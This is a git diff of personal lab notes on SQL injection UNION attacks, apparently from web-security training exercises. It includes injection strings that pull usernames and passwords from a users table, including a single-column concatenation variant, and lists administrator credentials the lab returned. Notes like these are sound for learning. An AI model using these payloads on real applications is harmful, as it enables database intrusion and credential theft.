@@ -83,19 +83,26 @@ END Goadl: Perform a SQL injection UNION attack that retireves all usernmes and 
 infomation need to log in as the administrator user.
 
 Query used: category=Gifts'UNION+select+username,password+from+users--
+
+Username: administrator
+Password: xve3icz3raaq5r2pyvkf
 --------------------------------------------------------------------------------------------------------------
 In the above examples we retrieved the username ad password in two different columns , now we will see how to retrieve the multiple values within a single column
 ' UNION SELECT username || '~' || password FROM users--
 
 The double-pipe sequence || which is a string concatenation operator on oracle. The injected query concatenates together the values of the username and password fields seperated by the ~ character 
 
+------------------------------------------------------------------------------------------------------------
+Lab: SQL injection UNION attack, retrieving multiple values in a single column
+The lab contisn as SQL injection vlunerability in the product category filter.
+
+The database contains a different table called users, with columns called username and password.
+
+END Goad: To solve the lab , perform a SQL injection UNION attack that retrieves all username and passwords, and use the information to log in as the administrator user
+Actual query used to solve this lab:
+category=Pets' UNION SELECT NULL,username||'~'||password from users--
+Output:
+administrator~hrunyore2h97l8vixtgl
 
 
 
-
-
-
-
-
-Username: administrator
-Password: xve3icz3raaq5r2pyvkf
